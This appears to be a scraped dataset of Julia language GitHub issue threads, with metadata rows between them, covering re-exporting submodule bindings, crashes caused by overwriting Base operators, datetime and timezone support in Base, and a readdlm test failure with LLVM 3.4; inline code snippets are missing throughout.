valid. Whether this is a single word or a phrase depends on whether we want to be closer to a english sentence or a keyword. I could accept either.  I personally kind of like .  It's got a nice symmetry with .  I made a macro that mostly works for this pupose. I say mostly because relative module syntax does not work. The parser parses  as  and throws a syntax error on .  If we ever get a resolution of this issue, we would be able to remove hundreds of lines' worth of redundant-seeming exports from Base.LinAlg and then again from Base.  I'm with @friend, in that I find  most appealing. What's the downside to adding that as a keyword?  What does  do if you haven't imported/used anything from A, e.g. Exporting bindings that are not accessible in  is not really an option, so does it throw, export only the  module and none of its exported symbols, or implicitly call  or ? Unless it does something implicitly, it is even more verbose than the alternatives, since you need two lines of code instead of one. And if it does something implicitly, then we are adding a fourth keyword that imports bindings.  Throw an error.  Even though it's more verbose, I find it clearer and more natural than most of the proposed alternatives.  If  is going to throw if the module isn't already imported/used, it may as well be a macro? Since all imported/used modules will be in the module's scope by virtue of , it's not clear to me it needs to support relative module paths, which is the only thing a macro couldn't do.  Whats the advantage of being a macro? It would be totally inconsistent if we have , , ,  Minimalism? It would be one fewer reserved identifier, one fewer Expr head, and in Julia instead of C. It is already a little awkward if it joins  and  as (I think) the third keyword that throws an error if another keyword has not been used before it. I kind of see the symmetry, but it doesn't seem quite right to me You can add bindings from another module to the current module and you can export bindings in the current module from the current module, but you cannot export bindings in another module from the current module unless those bindings are already also present in the current module. Personally, I would still prefer one of the two options I've created PRs for. It seems to me that is less elegant and easier to screw up than But if everyone else wants  and is averse to the  symbol, I can try to make that happen.  Well, minimalism is a point that is always a concern when thinking about adding a keyword. I think the more general question is whether the regular Julia user should be confronted with the usage of macros. I would say no. This is an advanced thing and should not be part of the regular workflow. exportall is from my perspective something that will be needed in the ""regular use"" Its quite common to structure modules (namspaces, ...) into two levels.  @friend Yes, writing a macro might be an advanced thing that ordinary users should not need to worry about. However, I don't think using a macro is that advanced -- they don't even need to understand how a macro works behind the scene in order to use it. All what we need is to clearly document the macro's usage. For instance, @friend is a good example which everyone can easily understand and use. Also, a code author should be quite tech savvy when he is worrying about something like re-exporting names.  @friend macros are great. But still they do ""magical"" code transformations that I think most users should not be confronted with.  is a good example. This is a thing for advanced usage not for regular usage. I think reexporting names will be not that uncommon in practice. The export mechanism is Julias way for information hiding. And having submodules in modules is common and should also be encouraged.  A better example for ""macros all users should be comfortable with"" is .  Which I think should be replaced with a pure Julia implementation when we can. (I have one partially implemented.)  is pure Julia. It's just a macro. While a function could be useful for rare cases where the format string could vary at runtime, I am not sure how a function could be as performant as the macro, since the macro generates code based on the format string at load time. We also have , which is a keyword in most other languages.  Probably  and  are the best examples of macros for which my statement that macros are only for advanced users does not hold.  Comment fail. Need to try again on a different device.  Another approach to this is not to import and then re-export, but rather to make these modules somehow ""inherit"" from the other modules. I.e. something like this In particular, one could consider a ""bare module"" ‚Äì¬†currently created with the  keyword ‚Äì to be a module which inherits from no modules. However, you don't want this to be the default since it's handy to  all operators and have all of Base's exports available via . This default behavior could be expressed as this parentless module Then the default module behavior would be this Thus, writing  would be equivalent to the current  and writing  by itself would just be shorthand for .  @friend That proposal seems elegant, but I'm a little worried about the nested module case. I guess you'd have something like To make this work, we'd have to first load all nested modules, then import their bindings, and finally load the main module. I'm not sure how big of a change this would be. I'm also not sure one always wants to inherit unexported bindings from other modules. In the nested module case, there's no reason we'd need the unexported bindings in the main module, and some could conflict.  I didn't really mean for unexported bindings to be inherited. But yes, that is what I said.  Needs some more thought, but I think there's something clean here.  I like Stefans proposal if it plays nice with with submodules.  @friend Any further thoughts? Thinking about this more, I am a little worried about creating another way to import bindings that is subtly different from , , and . This might confuse more than it clarifies.  I recently read a Julia dev paraphrasing someone else, in saying that Julia takes a ""we're all consenting adults here"" attitude. I'd very much like to be able to consent to exporting all symbols (or having a module inherit the exports of a parent, following @friend's implementation idea). If I'm writing library A, I'd like to be able to divide its concerns up into submodules of X and Y. In this way someone who only needed, say, the ""Network"" portion could employ , but most users would be opting for . There isn't any more implicit namespace pollution involved here than in the  call itself; the module inheritence would still only be acting on explicitly defined exports from modules X and Y, but I would no longer need to export every new function added to either submodule twice. (And with further nesting comes further code duplication.) I love the module implementation and its decoupling from the files themselves, it makes structuring a project (and later refactoring) that much easier. But without being able to shuttle around the symbols I'm exporting from submodule to parent, maintaining that clean organization becomes a constant thorn in the side, as you micro-manage your exports from one level to the next. It would be of further use in reducing code duplication when you have a group of conceptually related packages or modules that are always imported together. For a concrete example, there's the OpenGL library. You have the actual API versioned symbols you require, as well as the GLU library, and your own wrappers and convenience functions. For every submodule you write, you're importing three separate modules that will always be imported together in your code, instead of being able to do something like Sorry for the lack of brevity, but I wanted to share some use cases. I'm a new Julia user coming mostly from python, and I've been bitten by this problem multiple times over the last few days.  Has there been any further progress, decision or discussion on this matter? Is @friend 's  package the agreed standard way to re-export the symbols of another package, i.e. should I use it?  Since I haven't seen any other options emerge, I think Reexport is the de facto standard.  Thanks @friend ) I will be relying on it and will keep an eye on this thread.  It would be really great if we could have this functionality in Base. It would be great to have metapackages that simply group several packages together in order to provide a larger set of functionality.  Needs some design thoughts to figure out how we want this to work and interact with  /  /  / etc.  Crossref #14472  I put together a macro implementation of something like this for one of my PRs as a demo  Seems feature-y. There might be syntax we could want, but we if that does happen we can live with  a macro until 2.0.  Re-export is evil.  I disagree that Reexport is evil. In writing a package with many levels of submodules, I find Reexport very convenient for managing namespaces across levels without lots of boilerplate code and code duplication. I echo the sentiment expressed above that this would be great functionality to have in Base. ",67,2,334,0,0,198,13,n,
julia/JuliaLang/23605,0.067544589,JuliaLang,julia,"fatal and strange: errors when overwriting Base.<, Base.==, etc. for Int64,Float64,etc. using @eval in v0.6.0",3464,34,22,0,0,"Reproduces 100% of the time for me [fatal] This is also 100% reproducible, but you must type each line after line 2 to get the same output [strange]  Well, if you overwrite critical function incorrectly that's exactly what should happen.  Not sure I agree with your claim that that is what exactly what should happen.  I think you mean ""we don't prevent users from overwriting critical functions; doing so may result in gibberish"". Is that the approach being taken with the language in general?  We tend to be permissive, but speaking in such general terms is not really useful. It would be very simple to make it an error to overwrite methods in , for example. It just hasn't seemed very urgent in practice.  Ok, thanks for clarifying.  Here's another piece of code, this time resulting in a segfault.  Is this also in the camp of ""don't write stupid code""? ‚ô†Set{Array{T}}() where {T&lt;Float64}` [segfault] I guess I'm not that clear on what type of crashes are worth reporting given that the code is not supposed to work.  None of overwrite base function causing crash are worth reporting. All of other segfaults/hard crashes that's not obviously using unsafe features are worth reporting and  does look like it should have a better error.  @friend We always appreciate bug reports and you should always report any possible issue you run into. Different cases are different. Even if two problems have the same underlying cause that is often not obvious at first. In this case, IIUC, the original problem report did not involve a segfault, whereas your new example does. In any case we absolutely do not take the attitude that nothing is supposed to work and so bug reports are futile. That is not a terribly productive inference to make.  Ok, thanks.  I'll keep reporting then and you guys can ignore at your leisure if i report something that's a known philosophical issue.  Let me know if you want me to open a separate issue for the segfault.  Please do.  @friend, there's a notion of ""type piracy"" which not everyone buys into, but if you do not commit type piracy, you are definitely in the clear in the sense of ""your code should not crash Julia"" type piracy is adding a method to a function that doesn't ""belong"" to you for arguments where none of the argument types ""belong"" to you. Or conversely, you are not committing an act of piracy if the function or one of the argument types belongs to you ‚Äì¬†in other words, you can be certain that what you define cannot conflict with anyone else. In this case, redefining very basic operations like integer comparison is very much type piracy the  operator and the type  belong to Base (i.e. everyone), so changing what  means is going to mess with everything. If you want to define your own  operator which has different behavior, just don't qualify the overload. You can even do so with a fallback to call .  Just to clarify that type piracy is a concept that is related although not a requirement for overwriting low level/ fundamental Base functions. There are other Base functions that you can overwrite for your own types that can cause low level operations involving your type to crash in a bad way. You can get this effect easily with type reflection functions, e.g. There's no type piracy involved here but it's in the same class as overwriting  (i.e. this code ""should"" crash julia). In both cases, Base code assumes certain functions to behave correctly and overwriting them can cause huge trouble. ",18,2,114,0,0,50,2,n,
julia/JuliaLang/3524,0.09302317,JuliaLang,julia,Time series support in Base?,25402,332,210,0,12,"Is it possible to merge Calendar into Base, possibly after some bikeshedding? We had so much discussion about time series support last year, then Calendar became the de facto time series tool without ever entering Base.  plus one If it's ironed out enough, I think time series support is a very natural expectation of Base material.  I really wish that this didn't entail depending on ICU, but we probably should.  Please ping me when this lands, as I should probably update build recipes and debian package requirements to include .  How much functionality can we retain without ICU?  I've started digging into it a little bit, and @friend can speak to it more, but currently  is very dependent on ICU. Excluding ICU would basically require rewriting everything, but I'm also inclined to think we could get the majority of the functionality in a very Julian way without ICU and also without it being too difficult to implement (ICU has pretty good documentation of everything). Would definitely be a fun project if we decided to go that way.  @friend It depends on what you mean by ""majority of the functionality"". Implementing zulu time in pure julia would be easy. Adding timezone support, however, would be quite difficult. As i see it, proper timezone handling is Calendar's raison d'etre.  @friend agree with @friend. Zulu time is implemented in pure Julia in  (the api is different from Calendar, but that would be a trivial change) Adding timezone support is the missing piece. I had some julia code to parse the olson database, but never got to implementing the conversions. On top of that, one needs leap second support. Another large piece of functionality that ICU provides is date formatting/parsing. All of which is certainly doable, but is a large chunk of work.  ICU is big, but it is easy to get on Linux and is included in OS X. I believe it also works on Windows. Even if we can reimplement much of what we need in Windows, it will be quite a chore to support. I am in favour of using ICU and bringing Calendar into Base. Over time, we could reduce our dependence on ICU, if circumstances demand.  My vote would be to start out with a simpler featureset in pure Julia (a la SimpleDate.jl) with a clean API that can be expanded over time and exclude the ICU dependence. Starting out with a more SQL-like support with Date, Time, DateTime types, lubridate-style arithmetic, duration, period, and interval support, and IO support with parsing/formatting is a solid foundation that provides a lot of basic functionality. As for leap seconds, we could take ICU's approach and ignore them ) (basically leave it to the operating system to figure out). Timezone support is definitely a bigger chunk of work to do manually, but there are simple ways to include basic functionality (as @friend mentioned) and marking it as a future feature for full support I think is reasonable.  @friend  happy to give you commit access to SimpleDate if you want to run with that codebase.  In general, I like @friend's gung ho attitude. My major worry is that we can't start using times without leap seconds and then introduce them later unless we tell people that the date time support is a draft at best.  Thanks @friend, I've enjoyed going over your code today and I'm taking a stab at adding features while trying to follow Calendar.jl's conceptual framework to get a working julia Calendar/Timezone implementation. The thing with leapseconds is there really isn't a lot of consensus on how to handle them at all. Most languages/applications (including ICU) have taken the approach that they're not going to worry about it and let it be an OS problem. Implementation can be tricky, but we can take a stab at it if we deem it important enough. I found blog post here with a good walkthrough of considerations, and also came across a slightly hacky way that Google deals with leapseconds. The problem with a lot of ""solutions"" (hacks mainly) is that they're all pretty much clever ways to trick servers into dealing with an extra second every once in a while and not really a formal API or anything. One thing I thought of was doing a simple cache of year seconds/milliseconds and basing our date parsing off of them. That would allow us to easily manually add seconds as needed, calculate accurate durations/intervals, and also has the added benefit of giving us much faster date parsing. Anyway, I'll plug away a little more and see if I can't push something for review.  I suspect that ignoring leap seconds might be best since 1) everyone else does it, making compatibility difficult if julia doesn't 2) if people do care about leap seconds, they would probably just use TAI (or have their own special method for dealing with it all) I think the easiest and least confusing solution would be to define a TAI timezone (or a seperate TAI datetime type), and define a method for converting between that and UTC by adding/subtracting the appropriate number of seconds that way, if you want the length of an interval for between  and  (stored in UTC), you could do something like  Ok, I just created new repo with a bunch of stuff I've been working on the last 2 weeks. Basically it ended up being a much larger beast than I anticipated, but that most of you were probably aware of. ) I think it's a really good start though for Date, Periods, TimeZone, and DateTime support in pure Julia.  Here's the repo  main influences for the code are as follows  @friend SimpleDate.jl package @friend Calendar.jl package the R  package Java's Joda-time (which is considered a gold standard across languages even and will soon be merged into core Java)  High-level framework/concepts  a  abstract type to represent a certain calendar's way of date calculations (== chronologies in Joda-time) a  abstract type which is subtyped by all identified zones in the Olson tz database (see ) bits types that represent certain relative/absolute durations of time, including , , , , , and  a  immutable with fields for year, month, and day and is parameterized by a certain  (the  is used by default). This is our ""low-precision"" type that doesn't have to worry about timezones and leap seconds and is easier to reason about in terms of period arithmetic. Similar to a partial datetime or LocalDate in Joda, or a simple Date type in many DBMS. This is very fast to work with doing ranges and arithmetic. a  type that can be used to create frequences given start/period/stop inputs. I think a pure  type could represent Intervals in lubridate/Joda where just a start/stop are given (used with arithmetic, not generating frequencies at all) a 64-bit  bits type that is parameterized by a certain  as well as a . It's value represents the number of Rata Die seconds (seconds since 0000-01-01T000000), similar in concept to a Rata Die day number (see code for more date algorithm comments). Since Unix time's epoch is 62135596860 Rata Die seconds, it's trivial to convert Unix timestamps to  types. Using the current default  though, leap seconds are included (try , so wrapping  in  will give you a DateTime 25 seconds or so in the future. (We could correct this with the  function though to give the true current time that someone sees on the clock).  Potentially useful additions  I mentioned a  type; having a  type would map Intervals in lubridate/Joda; this also open up sub-Second possibilities (having a start  instant and noting the attoseconds from that instant); this stems from a lengthy discussion I found in the forums last year I think a  immutable as 's analogue (field-based with Hour, Minute, Second) would be potentially useful as well I would really love to support Temporal Expressions a la  in Ruby link  This is definitely a first draft, and I'm positive there are holes to be plugged and lots of refinement needed. I would really appreciate any questions, critiques, discussion to push this forward. Sources SimpleDate.jl -  -  -  -  -  Algorithms -  Group Discussion -  convo pull request -  Thanks @friend , this is great. A couple of quick comments while I have more of a play with this  The loading of  seems dependent on the  of the Julia process. May this should be developed as a package intially, and loads made relative to  I assume you have a script to generate the timezone.csv when the Olson db is updated?  This currently seems about two orders of magnitude slower than  for simple data arithmetic.  What is the precision of the  . I personally think that its is fine if very high precision time usage needs specialised libraries, but others may disagree.    @friend  I've actually pushed a fix for loading , so let me know if you're still seeing a problem there. I'm actually unsatisfied with how the timezone data is handled in general and this was really just a ""get it working first"" kind of solution. I'd love to brainstorm some more ideas of how to be efficient here. Yeah, there's a script to generate the dataset All of the  stuff is definitely slower right now, particularly if you're using non-UTC timezones. Unacceptably slow really. If you're using the lower precision  type though, it should be faster from my initial benchmarks. The  precision is 64-bits with time measured in seconds, so the max date we can show is . This seems well beyond anything anyone should need for timestamps. I agree that for greater precision, an add-on package could provide even more functionality. The discussion here is what spurred my comment about having a possible  64-bit type that could represent a second^10*-p for higher precision intervals. From the discussion, it seems this was following NumPy's approach, but simpler because we could provide one parameterized type as opposed to NumPy's 26 or so new types they introduced for each power of 10. I guess I just am not familiar with actual use-cases enough to know how to best implement something like this or how best to work with this kind of type. Maybe someone who has had experience or is familiar with sub-second timing needs can comment a little more if this is something Julia should provide out of the box or is something better left to a package. I know @friend was involved a lot in that conversation.   Ok, I added  to METADATA and a README to the package repo, so hopefully more can try it out, kick tires, give it a whirl. I added a  file that runs common operations  times and returns the results. I also included a  file that was my baseline for comparing with the  package. Overall, I'm really pleased with how far the performance has come. @friend's profiler was a great help (and hopefully on windows soon?). Performance-wise,  is either on-par or faster on almost every benchmark. The remaining performance issues are when timezones are specified. I'd say it's at an acceptable/working level (compared to the first draft), but still 2x-4x slower than Calendar.jl. Right now, the timezone data is serialized in matrices for each timezone in the  folder and loaded as the timezone is called for (I like this approach because it manages memory better than slurping the entire db into memory to hold while the user works with timezones). The problem is that with certain timezones, its matrix is 100+ rows and currently, a simple linear search is used to do the lookup. I'm positive some kind of binary/trie/radix/indexed implementation would really help, but I'm actually not very experience with some of these advanced data structures/algorithms to try it out. I'd appreciate anyone's input here. Anyway, it's been a ton of fun working on this stuff and I've really enjoyed how much I've learned about bitstypes and type parameters through the process; it's definitely expanded my understanding on how Julia works and the potential there really is thru the type system. Feedback welcome!  This is really quite amazing. I am a bit taken for the moment, but will certainly jump into this in the next few days.  Vacations are always nice to mull things over. I've thought a lot about the Datetime stuff and particularly about timezone/leap second support and how to do it in a way that's both efficient and maintainable. Here's what I'd like to propose  Including something along the lines of the new Datetime2 package; it includes a simple  and Zulu/UTC-based  implementations (plus support for  types, , , etc.). The code is fast, efficient (~400 lines of code), and provides a lot of date/time functionality without having to deal with any timezone/leap second business. The other main factor here is that this code isn't likely to change (other than normal optimizations, tweaks, etc.).  The creation of a  package (that could possibly live in the JuliaLang organization). This package would include timezone and leap second support similar to what I've pushed in the original  package mentioned earlier in this thread. It would be fully compatible with  code and really just extend it for the additional functionality. The main driving force for splitting this functionality into a separate package that a user would add thru the package manager is maintainability. Leap seconds are announced no more than 6 months before one occurs (either the end of June or end of December). This would fly while Julia is pre-1.0, but imagine if companies are eventually anchoring to v1.0 or v2.0 and new leap seconds are added while a new Julia version is more than 6 months away. It's the same issue with timezone information. The Olson tz database is updated regularly, much more frequently than Julia language releases. Splitting timezone data/functionality into it's own package allows the package to maintain a similar release cadence with Julia, but also include its own ""updates"" to its release branches when they happen, without the fear of breaking user's code.   Feel free to check out the new Datetime2 package (it's really fast!), and I'd love to hear everybody's thoughts on the proposal.  I really appreciate how much thought you've put into this. I think that @friend is the other person here with the most expertise in date and time stuff, and @friend has also done a lot of work on this stuff, so I defer to your collective judgements, but that sounds like a sound plan to me.  I've started using this and think it would be great to have in Base. Getting this finalized will still take some work, but this is very close to the kind of design I'd like to see (as a person without any detailed expertise in time representations).  Neat stuff! I have some reservations about the API, however, in particular the way periods are handled. Eager down-conversion, e.g.,  feels like a mistake. It's an approximation, and it makes period arithmetic non-associative I also don't think splitting the package in two is a great idea.  @friend, can you elaborate more on why you think splitting the package in two is a bad idea? I agree that at first glance, it seems unintuitive and a little weird, but I think the advantages I mentioned in having always-up-to-date timezone/leap second information is a major win. w.r.t timezones, every other major datetime package (Joda, Noda, etc.) ships with a static repo of the timezone data and details a long, complicated download-reformat-recompliation process for manually updating. And for leap seconds, I would argue that we shouldn't support leap seconds in Base under any circumstance. The fact that a new leap second can occur within 6 months would quickly render a static release useless (imagine running a server logging timestamps, expecting leap second support). We'd put ourselves in the same camp as Joda/Noda detailing a manual update process that would surely turn off users. With the package system stabilizing, I think it provides an excellent--and simple--way to provide updates of timezone/leap second data. As for the period arithmetic, I agree that there's a possible gotcha, but there's also not a clear solution without losing some expected behavior or have inconsistencies (e.g. not allow years/months, but allow days). I see a few options  Keep it as is, with default conversions (365 days in a year, etc.) and be upfront/explicit about it and possible gotchas associated with leap years and year + date arithmetic. Note that any  operation already results in an error.  Get rid of inter-period conversions. Then your first example above would calculate the same, but the 2nd, with years(4) + days(1) in parenthesis, would result in an error. Provide a warning/message any time a conversion happens; I initially did this and included months, but it was pretty annoying and probably not a good way to go. Do the same as 2, but also provide a  type (basically a Dict with (Period=&gt;Value), when arithmetic is done, it follows a specific order (greatest to least, first to last, etc.) This is what Noda has done.   I agree with all of this. But these arguments work equally well with the proposition ""we shouldn't merge Datetime into Base"". Splitting Datetime and merging part of it into Base is liable to create two tightly-coupled modules with different release schedules. So instead, let's not split Datetime up, and leave it as a package. As you say, the package system works great. This is also what Calendar does, so it's the solution i prefer. But if Datetime remains a package, then you're free to implement the solution you prefer.  I think DateTime is important enough that there should be a single canonical implementation. Imagine a system where DataFrames depends on one kind of datetime object, and @friend 's TimeSeries package usage a different type of Date. One would be converting between different types of dates all over one's codebase. This arises  quite often in Java projects, where one dependent library uses JODATime, and another uses java.lang.Date ... (at least there are converters available in this case) While one may make such an argument about any facility, I believe datetimes are fundamental enough that this matters a lot. The best (only?) way of ensuring this is to have a solid date time implementation in Base.  On Jul 17, 2013 253 PM, ""Mike Nolta"" notifications@friend.com wrote two is a bad idea? ... With the package system stabilizing, I think it provides an excellent--and simple--way to provide updates of timezone/leap second data. proposition ""we shouldn't merge Datetime into Base"". two tightly-coupled modules with different release schedules. I'm not sure I follow/understand you here. It would probably be clearer if the DateExtensions package existed already, but what I meant to convey earlier and what I forsee is a tightly controlled interaction between the DateTime module in base and the DateExtensions package. The base module would release along with the rest of Julia base, and the DateExtensions would follow the same schedule for any major updates (though I don't forsee many major updates as it will mainly be a data repo). In between releases, the only updates to the DateExtensions package would be timezone and leap second data additions, which would be entirely non - breaking. Is there some concern or potential misstep I'm missing with this kind of setup? -Jacob So instead, let's not split Datetime up, and leave it as a package. As you say, the package system works great. a Dict with (Period=&gt;Value), when arithmetic is done, it follows a specific order (greatest to least, first to last, etc.) This is what Noda has done. Datetime remains a package, then you're free to implement the solution you prefer.  It seems like the main concern about putting everything in Base is the lack of a good way to update things in a timely manner. Perhaps it's time to think outside of the box; is there any reason we couldn't use the machinery inside of Pkg to provide updates to packages that we could ship with Julia? E.g. something in between Base and ~/.julia? Either something that you can‚ô†usingPkg.add()`, (e.g. a simple package that just comes preinstalled) or something that is automatically used a la Base. But these arguments work equally well with the proposition ""we shouldn't merge Datetime into Base"". I think DateTime is important enough that there should be a single canonical implementation. Imagine a system where DataFrames depends on one kind of datetime object, and @friend  's TimeSeries package usage a different type of Date. One would be converting between different types of dates all over one's codebase. This arises quite often in Java projects, where one dependent library uses JODATime, and another uses java.lang.Date ... (at least there are converters available in this case) While one may make such an argument about any facility, I believe datetimes are fundamental enough that this matters a lot. The best (only?) way of ensuring this is to have a solid date time implementation in Base. ‚Äî Reply to this email directly or view it on GitHub Have some time this week to jump into this conversation. Great stuff.  @friend Thanks for the details. But i read your plan and think, ""This sounds like a hassle. Why bother?"" @friend I don't really buy this argument. There are lots of important packages not in base. If Datetime is high quality, people will use it. If interop becomes a problem, we can ask maintainers to switch. Maybe i'm wrong, but my gut feeling is that the benefit of including this in base is modest at best, and not worth the cost of splitting up the package.  I agree with most of @friend's points. Preventing fracturing of date/time representations is largely a social issue and partly a technical issue of having an official date/time package that's good enough that everyone wants to use it instead of rolling their own. The biggest argument to me for having a time representation in base is that we might want to have functions in base return objects of that type. The  function, for example. But I'm not sure if those should just use float seconds since epoch or whatever.  R has some experience iterating through ways of dealing with time and there is a good man page at  which is pretty long to post here (I'll do it if someone wants it). I think base would be well-served to have at least a foundational time-based type. It can have a timezone field that defaults to  so those data objects that don't need low latency (ie, daily, monthly, yearly) can use it. This time type can then be tagged as an  in a  and will be a path to plotting basic time series. Being able to plot seasonal monthly birth rates from a DataFrame should be available out of the box (base) while those who want more precision and ability to aggregate across specific time periods can access a package.  So after having a go at splitting the  package into two, I have to admit that @friend was right in that it would probably be too much of a hassle. Turns out the actual implementation of having two modules try and be tightly linked is pretty tricky without straight up redefining/overriding exact methods, which doesn't seem like a great user experience (if a workaround to #265 comes about, this could probably be managed). So while splitting the package in two conceptually seems like a great idea for maintainability, practically it doesn't seem to be the best solution. I've merged the revised/enhanced codebase of  into  now and will plan on deleting the  repository. My plan is to keep testing/enhancing  (I actually just pushed temporal expression support which ends up being very natural through using anonymous functions as the ""step"" in a DateRange; see the bottom of the README). I'm happy to help support anything that would like to be included in Base, otherwise,  can continue to be its own package.  @friend @friend  Well, to me the notion of a programming language without date/time support in its standard library seems incomplete. I suppose in the same way a language without BLAS/LAPACK support will seem incomplete to most Julia users. So I would want some kind of date time module in base. But, at the end of day, that's a pretty subjective opinion.  Yes, but things can develop outside and be brought into Base later.  Good point. We haven't gotten beyond 0.2 yet. How about a milestone, say by 0.5?  Re @friend thinking outside the box. If DateTime moves into base, the issues regarding keeping the leap seconds and timezone information up to date come to the forefront.  What if there was a package like , that contained  and a  file, which is installed by default, and possibly auto-updated on julia start (in  by default, so it is easy to turn off?).  That could provide a nice way to keep this information, and possibly other information on a similar release schedule, up to date, and separate from stable code. Or the first call to a function that uses  prints a line warning that it is out of date, sort of like deprecated functions.  @friend, that's a great idea! And we've actually been discussing doing just that over here. I just pushed some changes the other day that should allow us to do this.  Auto-updating anything is not ok. You can't start julia and have it make network connections you didn't ask for. In general anything like that should be opt-in not opt-out.  I think including the data updates in point releases is probably fine.  Good clarification @friend. Yes, we wouldn't be pushing anything automatically, but it could still be as simple as installing an  package that could be manually updated with  and the timezone/leap second data would refresh.  Reopening; this was closed by the accidental bizarro-merge in #7825. ",115,16,850,0,0,569,18,n,
julia/JuliaLang/6757,0.200188202,JuliaLang,julia,readdlm test failure on 64-bit Fedora with LLVM 3.4,15169,167,201,0,5,"I see this failure when running tests in my RPM package in 64-bits on a Fedora build machine. This is with git master as of today. Funnily the test passes on my machine; is it because it's been fixed in the recent hours?  Strange... Is the  file present and can be found from where the tests are running? Sorry, I don't have access to a Fedora machine, could you run the failing test from the REPL?  @friend As I said, I'm not able to reproduce the bug on my machine, only on the Fedora build VM. Could you suggest a few commands I could add so that the needed debug info is printed when building the package?  Sure. Start the REPL in the test folder f = joinpath(""perf"", ""kernel"", ""imdb-1.tsv"") isfile(f) dlm_data = readdlm(joinpath(""perf"", ""kernel"", ""imdb-1.tsv""), '\t') ‚ô†`  @friend I can't reproduce the bug at the REPL. It would be nice if you could think of a few things which could fail, so that I put a series of debugging statements in my RPM package, and get the logs after the build runs. I'll test that the file exists, but I can't see any reason why it could be missing, so I'd like to test a few other possibilities if you have ideas (each build takes some time to start).  A complete traceback of the exception would help identify the source line where  occurred and then we can add more debug statements. So, if the file exists, just a  of that file would print the exception stack.  OK, got it. I think this is related to the fact that I build the RPM package against LLVM 3.4. Unfortunately, that's the only available version in Fedora 20. I've eventually simplified the command to this And I'm able to reproduce this locally when using LLVM 3.4. Do you think it's worth trying to fix? Without support for this version I'm not sure I'll be able to package Julia for Fedora -- though I need to investigate this issue since in the long-term this may prove problematic.  I use llvm 3.4 on Mac and haven't seen this failure.  That's weird. Going back to 3.3 (where possible, it's a little hackish on Fedora 20 now) clearly fixed the problem.  Any ideas about how I could debug the problem further?  Cool! -)  I was able to replicate this on a ubuntu 13.10 machine as well. Also observed that in method , the values in tuple  mysteriously change sometime after the call to  at line 293 (). Adding debug statements in the method shifts the problem around. Looks like some corruption?  Was that in llvm 3.4 or 3.3?  Also happens in 3.5.  Removing 0.3 milestone, as 0.3 uses LLVM 3.3 only. We can reprioritize if this turns out to happen with LLVM 3.3 as well.  Yet it's going to prevent me from packaging 0.3 in Fedora. Not saying it should be a blocker, but it's still relatively annoying.  Is that because fedora will only support llvm 3.4? They really shouldn't do that. Different versions of llvm are in general quite incompatible.  Yeah, that's something I'm going to discuss with them. LLVM maintainers recently updated to 3.4, and for now I seem to be forced to follow this change.  That is a bummer if we can't be in the next fedora release.  I've just asked LLVM Fedora maintainers about this problem  If the fix does not require major work, it would be really nice if we can fix this issue for LLVM 3.4 for the 0.3 release.  Yeah, that and all the other bugs we don't yet know about.  I am sure there are others. Let's see what the Fedora LLVM maintainers say. Otherwise, IIUC, we could be in the fedora-updates repository.  Yeah, there may well be other bugs hidden somewhere... At least tests should catch the most important ones. @friend fedora-updates is the normal place were new packages appear, and that's really not a problem to be there. The question is rather, can Julia be included at all? But we'll likely figure out a solution.  Not sure how useful this is, but the cutoff point to get this error is around 15 lines. For example,  works, but  fails. (It's sort of context-dependent, as taking  fails at . so maybe total # characters).  I see the same change of  that @friend sees, and it appears to happen between when  calls  and the catch block for the  thrown by . When I try to print  in the catch block, the  value is correct, but I get a segfault in  because one of the arguments has been nulled out. So it seems like we are clobbering the stack somewhere.  Here is where  is changed. Manually resetting this address to 16 allows the read to complete without the . @friend any ideas? why would we be passing a tuple on the stack and then overwriting that space? calls jl_alloc_tuple 0x00007ffff45b6214 &lt;julia_dlm_fill;17354+532&gt;   ff d0   callq  *%rax    0x00007ffff45b6216 &lt;julia_dlm_fill;17354+534&gt;   48 89 c3    mov    %rax,%rbx    0x00007ffff45b6219 &lt;julia_dlm_fill;17354+537&gt;   48 89 9c 24 98 01 00 00 mov    %rbx,0x198(%rsp) fill the tuple 0x00007ffff45b6221 &lt;julia_dlm_fill;17354+545&gt;   0f 28 44 24 60  movaps 0x60(%rsp),%xmm0 =&gt; 0x00007ffff45b6226 &lt;julia_dlm_fill;17354+550&gt;   66 48 0f 7e c7  movq   %xmm0,%rdi ‚ô†  I'll have a look at this. Thanks for the through analysis so far.  @friend Hi. For demonstration purposes I've built julia from your SPEC file on build.opensuse.org, which has Fedora 20 as build target, but Fedora there is as it was released, e.g. no fedora-updates. So it still has LLVM 3.3. Tests were passed successfully. See the link  see you cannot use these packages in up-to-date Fedora 20, but only with original, released image. These packages are for demonsration only.  @friend Interesting. Actually, I can do the same using Fedora's Copr build service. As you said, the problem appears when trying to install the package, since LLVM 3.3 conflicts with the latest Mesa from fedora-updates. It would be interesting to try to adapt the various Fedora packages to SuSE.  @friend Hm, how do you restrict a build job on Copr to use Fedora w/out updates? I see someone tried to build julia on openSUSE, if you search for a 'julia' on  @friend Actually, I don't need to it seems that the 'fedora' repo is available from Copr, even if 'fedora-updates' is available too. Making the Julia package depend on LLVM 3.3 works. Regarding openSUSE packages, IIRC the existing Julia package bundles all dependencies, and to get included in the distribution one should package libraries separately as I did for Fedora. But we're really out of topic here, better move the discussion elsewhere.  I see this can be reduced to just julia&gt; readdlm(IOBuffer(""a\na"")) ERROR BoundsError()  in setindex! at ./array.jl308  in colval at ./datafmt.jl324  in store_cell at ./datafmt.jl195  in dlm_fill at ./datafmt.jl303  in dlm_fill at ./datafmt.jl316  in readdlm_string at ./datafmt.jl276  in readdlm_auto#88 at ./datafmt.jl59  in readdlm#86 at ./datafmt.jl49  in readdlm#84 at ./datafmt.jl46  But this one works, with extra space at the beginning of string  Same issue with readcsv (one backend)  FWIW, we're probably going to be able to use LLVM 3.3 in Fedora (even though this may take a bit longer). Doesn't mean this bug shouldn't be fixed, of course!  @friend do you had a chance to look into this?  I looked at briefly, but never got to isolate it. It's on my todo list though (I wanted to work on it today, but got held up by #7868). I can confirm that this is an optimizer bug though, so the first thing I'll do tomorrow is disable passes and see what makes it work.  Just to point a fix to this issue would help for the official Debian package. The next release of Debian will not feature LLVM 3.3, only 3.4 and 3.5 (the Debian maintainer of LLVM says that 3.3 is too old now and unmaintained). And the Debian freeze happens on early november, so Julia 0.4 will not be ready by then. So my only option is to ship Julia 0.3 with LLVM 3.4 or 3.5.  We can do a point release of Julia 0.3.x that uses LLVM 3.5.  @friend That would be great. The Debian deadline is roughly end of October, but even if the point release happens after that, I could still backport patches that are on the 0.3 git branch.  Also, the general attitude that distros have about LLVM is not reasonable or healthy. LLVM is not a normal library that you can just upgrade or downgrade willy nilly ‚Äì¬†it is core infrastructure for building compilers and programming languages ‚Äì¬†the exact version matters a lot. By contrast, every distro 